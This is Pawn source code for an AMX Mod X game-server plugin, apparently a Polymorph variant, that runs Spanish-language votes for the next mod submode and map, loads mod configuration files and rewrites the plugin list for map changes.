public startSubmodeVote()
{
	g_voteStarted++;
	
	// Display Submode Menu
	const iDisplayTimes = 3;
	const Float:fDisplayTimes = 3.0;
	
	static mkeys, iter = 0;
	new a, iTime;
	
	if (!iter)
	{
		iter = iDisplayTimes;
	}
	
	if (!g_szMenu[0])
	{
		mkeys = 0;//(1<<SELECTMAPS + 1)
		new pos = formatex(g_szMenu, charsmax(g_szMenu), "\r%s\y Elegir la configuracion:^n^n", g_ChatPrefix)
		new submodeNum = ArraySize(g_aModSubmodes[g_iNextMod])
		
		for (g_voteNum = 0; g_voteNum < submodeNum; ++g_voteNum)
		{
			//g_nextName[g_voteNum] = a
			pos += formatex(g_szMenu[pos], charsmax(g_szMenu)-pos, "\r%d.\w %s %a^n", g_voteNum + 1, g_szModNames[g_iNextMod], ArrayGetStringHandle(g_aModSubmodes[g_iNextMod], g_voteNum));
			mkeys |= (1<<g_voteNum)
			g_voteModCount[g_voteNum] = 0
		}
		
		//g_szMenu[pos++] = '^n'
		//g_voteModCount[SELECTMAPS] = 0
		
		//format(g_szMenu[pos], 511, "^n\r%d.\w Ninguno", (SELECTMAPS+2)%10)
		set_task(fVoteTime, "checkSubmodeVotes")
		colored_print(0, print_chat, "Es hora de elegir la configuracion de %s.", g_szModNames[g_iNextMod])
		client_cmd(0, "spk Gman/Gman_Choose2")
		log_amx("Vote: Voting for the next submode started")
	}
	
	iTime = floatround(fVoteTime/fDisplayTimes);
	
	for (a = 1; a <= 32; a++)
	{
		if (!(g_bVotedForSubmode & (1<<(a&31))) && is_user_connected(a))
		{
			show_menu(a, mkeys, g_szMenu, iTime * iter, "Choose NextSubmode:");
		}
	}
	
	iter--;
	
	if (iter)
	{
		set_task(fVoteTime/fDisplayTimes, "startSubmodeVote");
	}
}

public countSubmodeVotes(id, key)
{
	// Count Submode Votes
	
	if (get_pcvar_num(g_pVoteAnswers))
	{
		new name[32]
		get_user_name(id, name, 31)
		
		colored_print(0, print_chat, "%s ha elegido %s %a", name, g_szModNames[g_iNextMod], ArrayGetStringHandle(g_aModSubmodes[g_iNextMod], key))
	}
	
	g_bVotedForSubmode |= (1<<(id&31));
	++g_voteModCount[key]
	return PLUGIN_HANDLED
}

public checkSubmodeVotes()
{
	// Check Submode Votes
	new b = 0
	
	for (new a = 0; a < g_voteNum; ++a)
		if (g_voteModCount[b] < g_voteModCount[a])
			b = a
	
	setNextSubmode(b + 1) // Set g_iNextMod
	colored_print(0, print_chat, "Eleccion finalizada. El siguiente modo será^x03 %s %a", g_szModNames[g_iNextMod], ArrayGetStringHandle(g_aModSubmodes[g_iNextMod], g_iNextSubmode-1));
	// colored_print(0, print_chat, "%L", LANG_PLAYER, "CHO_FIN_NEXT_MOD", g_szModNames[g_iNextMod]) // ML
	log_amx("Vote: Voting for the next submode finished. The next submode will be %a", ArrayGetStringHandle(g_aModSubmodes[g_iNextMod], g_iNextSubmode-1))
	
	g_szMenu[0] = 0;
	
	set_task(fBetweenVote, "startMapVote")
}

public startMapVote()
{
	g_voteStarted++;
	
	// Display Map Menu
	const iDisplayTimes = 3;
	const Float:fDisplayTimes = 3.0;
	
	static mkeys, iter = 0;
	new a, iTime;
	
	if (!iter)
	{
		iter = iDisplayTimes;
	}
	
	if (!g_szMenu[0])
	{
		mkeys = 0;//(1<<SELECTMAPS + 1)
		new pos = formatex(g_szMenu, charsmax(g_szMenu), "\r%s\y Elegir el siguiente mapa:^n^n", g_ChatPrefix)
		
		new mapNum, Array:mapsToUse;
		
		if (g_aModSubmodes[g_iNextMod] == Invalid_Array)
		{
			mapNum = g_iMapNums[g_iNextMod]
		}
		else
		{
			mapsToUse = ArrayCreate();
			mapNum = 0;
			for (g_voteNum = 0; g_voteNum < g_iMapNums[g_iNextMod]; g_voteNum++)
			{
				if (ArrayGetCell(g_aMapSubmodes[g_iNextMod], g_voteNum) & (1<<g_iNextSubmode))
				{
					ArrayPushCell(mapsToUse, g_voteNum)
					mapNum++
				}
			}
		}
		
		new dmax = (mapNum > SELECTMAPS) ? SELECTMAPS : mapNum
		
		new b;
		for (g_voteNum = 0; g_voteNum < dmax; ++g_voteNum)
		{
			b = random_num(0, mapNum - 1)
			
			do
			{
				a = (mapsToUse == Invalid_Array) ? b : ArrayGetCell(mapsToUse, b)
				if (++b >= mapNum) b = 0
			}
			while (isInMenu(a))
			
			g_nextName[g_voteNum] = a
			pos += formatex(g_szMenu[pos], charsmax(g_szMenu)-pos, "\r%d.\w %a^n", g_voteNum + 1, ArrayGetStringHandle(g_aModMaps[g_iNextMod], a));
			mkeys |= (1<<g_voteNum)
			g_voteMapCount[g_voteNum] = 0
		}
		
		if (mapsToUse != Invalid_Array)
			ArrayDestroy(mapsToUse)
		
		//g_szMenu[pos++] = '^n'
		g_voteMapCount[SELECTMAPS] = 0
		g_voteMapCount[SELECTMAPS + 1] = 0
		
		new mapname[32]
		get_mapname(mapname, 31)
		if( g_iThisMod == g_iNextMod && !task_exists(TASK_FORCED_MAPCHANGE)) // If staying on this mod allow extending the map.
		{
			if( get_pcvar_float(g_pTimeLimit) < get_pcvar_float(g_pExtendMax) )
			{
				pos += formatex(g_szMenu[pos], charsmax(g_szMenu)-pos, "^n\r%d. \yExtender\w %s^n", SELECTMAPS + 1, mapname)
				mkeys |= (1<<SELECTMAPS)
			}
		}
	
		//format(g_szMenu[pos], 511, "^n\r%d.\w Ninguno", (SELECTMAPS+2)%10)
		set_task(fVoteTime, "checkMapVotes")
		colored_print(0, print_chat, "%L", LANG_SERVER, "TIME_CHOOSE")
		client_cmd(0, "spk Gman/Gman_Choose2")
		log_amx("Vote: Voting for the nextmap started")
	}
	
	iTime = floatround(fVoteTime/fDisplayTimes);
	
	for (a = 1; a <= 32; a++)
	{
		if (!(g_bVotedForMap & (1<<(a&31))) && is_user_connected(a))
		{
			show_menu(a, mkeys, g_szMenu, iTime * iter, "Choose Nextmap:");
		}
	}
	
	iter--;
	
	if (iter)
	{
		set_task(fVoteTime/fDisplayTimes, "startMapVote");
	}
}

public countMapVotes(id, key)
{
	// Count Map Votes
	if (0 <= key <= SELECTMAPS)
	{
		g_bVotedForMap |= (1<<(id&31));
	}
	
	if (get_pcvar_num(g_pVoteAnswers))
	{
		new name[32]
		get_user_name(id, name, 31)
		
		if (key == SELECTMAPS)
			colored_print(0, print_chat, "%L", LANG_PLAYER, "CHOSE_EXT", name)
		else if (key < SELECTMAPS)
		{
			new map[32];
			ArrayGetString(g_aModMaps[g_iNextMod], g_nextName[key], map, charsmax(map))
			colored_print(0, print_chat, "%L", LANG_PLAYER, "X_CHOSE_X", name, map)
		}
	}
	++g_voteMapCount[key]
	
	return PLUGIN_HANDLED
}

public checkMapVotes()
{
	new b = 0
	
	for (new a = 0; a < g_voteNum; ++a)
		if (g_voteMapCount[b] < g_voteMapCount[a])
			b = a

	
	if (g_voteMapCount[SELECTMAPS] > g_voteMapCount[b]
	    /*&& g_voteMapCount[SELECTMAPS] > g_voteMapCount[SELECTMAPS+1]*/)
	{
		new mapname[32]
		
		get_mapname(mapname, 31)
		new Float:steptime = get_pcvar_float(g_pExtendStep)
		set_pcvar_float(g_pTimeLimit, get_pcvar_float(g_pTimeLimit) + steptime)
		colored_print(0, print_chat, "%L", LANG_PLAYER, "CHO_FIN_EXT", steptime)
		log_amx("Vote: Voting for the nextmap finished. Map %s will be extended to next %.0f minutes", mapname, steptime)
		
		return
	}
	
	new smap[32]
	if (g_voteMapCount[b]/* && g_voteMapCount[SELECTMAPS + 1] <= g_voteMapCount[b]*/)
	{
		ArrayGetString(g_aModMaps[g_iNextMod], g_nextName[b], smap, charsmax(smap));
		set_pcvar_string(g_pNextmap, smap);
	}
	else // added 1.0.3
	{
		ArrayGetString(g_aModMaps[g_iNextMod], g_nextName[0], smap, charsmax(smap));
		set_pcvar_string(g_pNextmap, smap);
	}
	
	get_pcvar_string(g_pNextmap, smap, 31)
	colored_print(0, print_chat, "%L", LANG_PLAYER, "CHO_FIN_NEXT", smap)
	log_amx("Vote: Voting for the nextmap finished. The nextmap will be %s", smap)
	
	if (!task_exists(TASK_FORCED_MAPCHANGE))
	{
		switch (g_iModInfinite[g_iThisMod])
		{
			case 0:
			{
				colored_print(0, print_chat, "El cambio de mapa se efectuara en la proxima ronda.");
				set_pcvar_float(g_pTimeLimit, 0.0);
				register_event("HLTV", "intermission", "a", "1=0", "2=0");
			}
			case 2:
			{
				colored_print(0, print_chat, "Se esperara a que termine el modo^x03 %s^x01 para cambiar el mapa.", g_szModNames[g_iThisMod]);
				
			}
		}
	}
}


/*
 *	Auxillary Functions
 */

/* Set the 'NextMod' index */
stock setNextMod(index)
{
	g_iNextMod = index
	set_pcvar_string(g_pNextMod, g_szModNames[g_iNextMod])
}

/* Set the 'NextSubmod' index */
stock setNextSubmode(index)
{
	g_iNextSubmode = index
}

/* Set the default nextmap for the next mod */
stock setDefaultNextSubmode()
{
	setNextSubmode(g_aModSubmodes[g_iNextMod] == Invalid_Array ? 0 : 1)
}

/* Set the default nextmap for the next mod */
stock setDefaultNextmap()
{
	new szMapName[32]
	if (g_aModSubmodes[g_iNextMod] == Invalid_Array)
		ArrayGetString(g_aModMaps[g_iNextMod], 0, szMapName, charsmax(szMapName))
	else
	{
		for (new i = 0; i < g_iMapNums[g_iNextMod]; i++)
		{
			if (ArrayGetCell(g_aMapSubmodes[g_iNextMod], i) & (1<<g_iNextSubmode))
			{
				ArrayGetString(g_aModMaps[g_iNextMod], i, szMapName, charsmax(szMapName))
				break;
			}
		}
	}
	
	set_pcvar_string(g_pNextmap, szMapName)
}

stock bool:loadMaps(szConfigDir[], szMapFile[], iModIndex)
{
	new szFilepath[STRLEN_PATH], szData[STRLEN_MAP]
	new szSubs[9], subs, i
	
	g_iMapNums[iModIndex] = 0
	formatex(szFilepath, charsmax(szFilepath), "%s/%s", szConfigDir, szMapFile)

	new f = fopen(szFilepath, "rt")

	if(!f)
		return false

	while(!feof(f))
	{
		fgets(f, szFilepath, charsmax(szFilepath))
		
		if(!szFilepath[0] || szFilepath[0] == ' ' || szFilepath[0] == ';' || (szFilepath[0] == '/' && szFilepath[1] == '/'))
			continue;
		
		szSubs[0] = EOS;
		szData[0] = EOS;
		
		parse(szFilepath, szData, charsmax(szData), szSubs, charsmax(szSubs));
		trim(szData)
		
		if(is_map_valid(szData))
		{
			ArrayPushString(g_aModMaps[iModIndex], szData)
			subs = 0;
			
			for (i = 0; 48 < szSubs[i] <= 56; i++)
			{
				subs |= (1<<szSubs[i]-48)
			}
			
			if (!subs)
			{
				subs = -1;
			}
			
			ArrayPushCell(g_aMapSubmodes[iModIndex], subs)
			g_iMapNums[iModIndex]++
		}
	}
	fclose(f)
	return true
}

/**
 *  Rewrite plugins-polymorph.ini for the next mod.
 *  Will create the file if it does not exist.
 *  Use only when you need to change the mod!!!
 */
stock UpdatePluginFile()
{
	new szMainFilePath[STRLEN_PATH]
	new pMainFile
	
	get_configsdir(szMainFilePath, charsmax(szMainFilePath))
	format(szMainFilePath, charsmax(szMainFilePath), "%s/plugins-polymorph.ini", szMainFilePath)
	
	pMainFile = fopen(szMainFilePath, "wt")
	
	if(pMainFile)
	{
		fprintf(pMainFile, ";ThisMod:^"%s^" %d^r^n", g_szModNames[g_iNextMod], g_iNextSubmode)
		fputs(pMainFile, "; Warning: This file is re-written by Polymorph plugin.^r^n")
		fprintf(pMainFile, "; Any content added manually will be lost.^r^n")
		
		if( g_iModCount > 0 )
		{
			new iPlugins_num, szPluginName[STRLEN_NAME]
			
			iPlugins_num = ArraySize(g_aModPlugins[g_iNextMod])
				
			for(new j = 0; j < iPlugins_num; j++)
			{
				if (ArrayGetCell(g_aPluginSubmodes[g_iNextMod], j) & (1<<g_iNextSubmode))
				{
					ArrayGetString(g_aModPlugins[g_iNextMod], j, szPluginName, charsmax(szPluginName))
					fprintf(pMainFile, "%s^r^n", szPluginName)
				}
			}
		}
		else
		{
			fputs(pMainFile, ";;;  ERROR  ;;;\r\n;;; No MODs Loaded ;;;")
		}
		fclose(pMainFile)
	}
}

bool:isInMenu(id)
{
	for (new a = 0; a < g_voteNum; ++a)
		if (id == g_nextName[a])
			return true
	return false
}

stock bool:isModInMenu(id)
{
	for (new a = 0; a < g_voteNum; ++a)
		if (id == g_nextModId[a])
			return true
	return false
}

public team_score()
{
	new team[2]
	
	read_data(1, team, 1)
	g_teamScore[(team[0]=='C') ? 0 : 1] = read_data(2)
}

/* Show Scoreboard to everybody. */
public intermission()
{
	message_begin(MSG_ALL, SVC_INTERMISSION)
	message_end()
	set_task(get_pcvar_float(g_pChatTime), "changeMap")
}

/* Change map. */
public changeMap()
{
	new szNextmap[32]
	get_pcvar_string(g_pNextmap, szNextmap, charsmax(szNextmap))
	server_cmd("changelevel %s", szNextmap)
}

/* Exec Cvars */
public execCfg()
{
	new cfg_num = ArraySize(g_aCfgList)
	for(new i = 0; i < cfg_num; i++)
	{
		console_print(0, "%a", ArrayGetStringHandle(g_aCfgList, i))
		server_cmd("%a", ArrayGetStringHandle(g_aCfgList, i))
	}
	ArrayDestroy(g_aCfgList)
}

/* Initiate loading the MODs */
stock initModLoad()
{
	g_iModCount = 0
	new szFilepath[STRLEN_PATH], szConfigDir[STRLEN_PATH]
	get_configsdir(szConfigDir, charsmax(szConfigDir))
	formatex(szFilepath, charsmax(szFilepath), "%s/%s", szConfigDir, "polymorph")

	new filename[32]
	g_aCfgList = ArrayCreate(STRLEN_DATA)

	new pDir = open_dir(szFilepath, filename, charsmax(filename))
	if(pDir)
	{
		do
		{
			if( 47 < filename[0] < 58 )
			{
				g_aModMaps[g_iModCount] = ArrayCreate(STRLEN_FILE)
				g_aMapSubmodes[g_iModCount] = ArrayCreate()
				g_aModPlugins[g_iModCount] = ArrayCreate(STRLEN_FILE)
				g_aPluginSubmodes[g_iModCount] = ArrayCreate();
				if( loadMod(szFilepath, filename) )
				{
					server_print("MOD LOADED: %s %s", g_szModNames[g_iModCount], g_iThisMod == g_iModCount ? "<<<<<" : "") // Debug
					g_iModCount++
				}
				else
				{
					ArrayDestroy(g_aModMaps[g_iModCount])
					ArrayDestroy(g_aModPlugins[g_iModCount])
				}
			}

		} while( next_file(pDir, filename, charsmax(filename)) && g_iModCount < MODS_MAX )
		close_dir(pDir)
	}
	
	/* Exec Configs if Mod found */
	if( g_iModCount == 0 )
	{
		/* Zero mods loaded, set as failed */
		setNextMod(0)
		UpdatePluginFile()
		log_amx("[Polymorph] Zero (0) mods loaded.")
		set_fail_state("[Polymorph] Zero (0) mods were loaded.")
	}
	else if( g_iThisMod == -1 )
	{
		/* No mod found, set as failed, restart to fix. */
		setNextMod(0)
		UpdatePluginFile()
		log_amx("[Polymorph] Mod not found. Restart server.")
		set_fail_state("[Polymorph] Mod not found. Restart server.")
	}
	else
	{
		/* Set poly_thismod cvar */
		set_pcvar_string(g_pThisMod, g_szModNames[g_iThisMod])
		
		/* Execute Mod Config */
		set_task(4.0, "execCfg")
	}
}

/* Load individual MOD.  Return true on success */
stock bool:loadMod(szPath[], szModConfig[])
{
	new filepath[STRLEN_PATH]
	new szData[STRLEN_DATA], szPreCommentData[STRLEN_DATA]
	new key[STRLEN_MAP], value[STRLEN_MAP]
	
	formatex(filepath, charsmax(filepath), "%s/%s", szPath, szModConfig)
	new f = fopen(filepath, "rt")
	
	if(!f)
		return loadFail(szModConfig)

	/* Traverse header space */
	while(!feof(f) && szData[0] != '[')
	{
		fgets(f, szData, charsmax(szData))
		//trim(szData)
	}

	/* Load MOD specific variables */
	while( !feof(f) )
	{
		fgets(f, szData, charsmax(szData))
		trim(szData)

		switch( szData[0] )
		{
			case 0, ';': continue; // Comment/Blank line.
			case '[': break; // Next section found.
		}

		parse(szData, key, charsmax(key), value, charsmax(value))

		if(equali(key, "name"))
		{
			copy(g_szModNames[g_iModCount], charsmax(g_szModNames[]), value)
			if( equal(value, g_szThisMod) )
			{
				g_iThisMod = g_iModCount
			}
		}
		else if(equali(key, "mapspermod"))
		{
			g_iMapsPerMod[g_iModCount] = str_to_num(value) ? str_to_num(value) : 2 // Default to 2
		}
		else if(equali(key, "mapsfile"))
		{
			if( !loadMaps(szPath, value, g_iModCount) )
			{
				fclose(f)
				return loadFail(szModConfig)
			}
		}
		else if(equali(key, "infinite"))
		{
			g_iModInfinite[g_iModCount] = str_to_num(value);
		}
	}
					

	/* Load MOD specific cvars */
	while( !feof(f) )
	{
		fgets(f, szData, charsmax(szData))
		trim(szData)
		
		switch( szData[0] )
		{
			case 0, ';': continue; // Comment/Blank line.
			case '[': break; // Next section found.
		}

		/* Retain cvars if we are loading 'ThisMod' */
		if( g_iThisMod == g_iModCount )
		{
			strtok(szData, szPreCommentData, charsmax(szPreCommentData), "", 0, ';')
			trim(szPreCommentData)
			ArrayPushString(g_aCfgList, szPreCommentData)
		}

	}
	
	/* Load MOD submodes */
	new submodeCount, i, len;
	while( !feof(f) )
	{
		switch( szData[0] )
		{
			case 0, ';': // Comment/Blank line.
			{
				fgets(f, szData, charsmax(szData))
				trim(szData)
				continue;
			}
			case '[':
			{
				switch ( szData[1] ) // Next section found.
				{
					case '1' .. '8': // Max 8 submodes
					{
						if (submodeCount == 0)
						{
							g_aModSubmodes[g_iModCount] = ArrayCreate(STRLEN_NAME);
						}
						
						len = strlen(szData);
						for ( i = 0; i < len - 4; i++)
						{
							szData[i] = szData[i + 3];
						}
						szData[len - 4] = EOS;
						
						ArrayPushString(g_aModSubmodes[g_iModCount], szData);
						submodeCount++;
					}
					case 'p': break;
				}
			}
			default:
			{
				/* Retain cvars if we are loading 'ThisMod' */
				if( g_iThisMod == g_iModCount &&  g_iThisSubmode == submodeCount )
				{
					strtok(szData, szPreCommentData, charsmax(szPreCommentData), "", 0, ';')
					trim(szPreCommentData)
					ArrayPushString(g_aCfgList, szPreCommentData)
				}
			}
		}
		
		fgets(f, szData, charsmax(szData))
		trim(szData)
	}
	
	/* Load Plugins */
	while( !feof(f) )
	{
		fgets(f, szData, charsmax(szData))
		trim(szData)

		switch( szData[0] )
		{
			case 0, ';': continue; // Comment/Blank line.
			case '[': break; // Next section found.
		}

		strtok(szData, szPreCommentData, charsmax(szPreCommentData), "", 0, ';')
		trim(szPreCommentData)
		
		value[0] = 0;
		
		parse(szPreCommentData, szData, charsmax(szData), value, charsmax(value))
		ArrayPushString(g_aModPlugins[g_iModCount], szData)
		
		len = 0;
		
		for (i = 0; 48 < value[i] <= 56; i++)
		{
			len |= (1<<value[i]-48)
		}
		
		if (!len)
		{
			len = -1;
		}
		
		ArrayPushCell(g_aPluginSubmodes[g_iModCount], len)
		
	}
	// if all loads well increment g_iModCount
	// else clear used arrays and DO NOT increment g_iModCount
	fclose(f)
	return true
}

stock ordenar(out[], A[], N)
{
	new i, j, B, C, h;
	h = N;
	while (h > 0)
	{
		for (i = h-1; i < N; i++)
		{
			B = A[i];
			C = out[i];
			
			for (j = i; (j >= h) && (A[j - h] < B); j -= h)
			{
				A[j] = A[j - h];
				out[j] = out[j - h];
			}
			
			A[j] = B;
			out[j] = C;
		}
		
		h = h / 2;
	}
}

stock fillspaces(str[], len)
{
	for (new i = strlen(str); i < len; i++)
	{
		str[i] = ' ';
	}
}

/* Log "failed to load mod" message. return false (meaning "failed to load") */
stock bool:loadFail(szModFile[])
{
	server_print("Failed to load mod from %s", szModFile) // Debug
	log_amx("[Polymorph] Failed to load configuration file %s", szModFile)
	return false
}

stock colored_print(id, ignore = 0, const what[], any:...)
{
	#pragma unused ignore
	static message[190], len = 0;
	
	if (!len)
	{
		len = formatex(message, charsmax(message), "^x04%s^x01 ", g_ChatPrefix);
	}
	
	vformat(message[len], charsmax(message)-len, what, 4);
	
	static msgSayText = 0;
	
	if (!msgSayText)
	{
		msgSayText = get_user_msgid("SayText");
	}
	
	message_begin(id ? MSG_ONE : MSG_ALL, msgSayText, _, id);
	write_byte(33);
	write_string(message);
	message_end();
}

#if defined DEBUG
/* Debugging function */
public function()
{
	server_print("Printing:")
	for(new i = 0; i < g_iModCount; i++)
	{
		server_print("%s", g_szModNames[i])

		new plugs_num = ArraySize(g_aModPlugins[i])
		new plug_name[32]
		for(new j = 0; j < plugs_num; j++)
		{
			ArrayGetString(g_aModPlugins[i], j, plug_name, charsmax(plug_name))
			server_print("    %s", plug_name)
		}
		
		server_print("Maps:")
		
		new maps_num = ArraySize(g_aModMaps[i])
		new mapname[32]
		for(new j = 0; j < maps_num; j++)
		{
			ArrayGetString(g_aModMaps[i], j, mapname, charsmax(mapname))
			server_print("    %s", mapname)
		}
	}
}
#endif
